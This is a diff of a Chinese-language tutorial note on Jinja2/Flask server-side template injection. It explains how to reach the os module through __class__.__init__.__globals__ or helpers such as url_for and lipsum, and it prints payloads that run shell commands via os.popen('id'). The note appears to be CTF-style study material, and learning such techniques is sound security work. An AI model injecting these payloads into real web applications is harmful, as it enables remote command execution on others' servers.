@@ -48,9 +48,9 @@ print(cat().__class__.__init__.__globals__['os'].popen('id').read())
 ### `__init__`:拿出构造函数对象object的方法
 
 ```
-cat().__class__.__init__
+存在的对象.__class__.__init__
 ```
-#### **或者直接使用`url_for`,`get_flashed_messages`,lipsum,cycler,joiner,namespace这些象征函数对象的,使用是不用在经过__class__.__init__调出函数对象**
+#### **或者直接使用`url_for`,`get_flashed_messages`,lipsum,cycler,joiner,namespace这些象征函数对象的,使用是不用在经过__class__.__init__调出函数对象，但如果使用url_for()，它返回的是普通变量，这时候就不会存在全局字典了**
 
 ```
 url_for.__globals__['os'].popen('id').read()
@@ -59,11 +59,11 @@ url_for.__globals__['os'].popen('id').read()
 #### `__globals__`:对象方法模块出生的全局字典,包含os等主要模块
 
 ```
-url_for().__class__.__init__.__globals__
+存在的对象.__class__.__init__.__globals__
 ```
 #### 掏出全局字典的os
 ```
-url_for().__class__.__init__.__globals__['os']
+存在的对象url_for().__class__.__init__.__globals__['os']
 ```
 
 
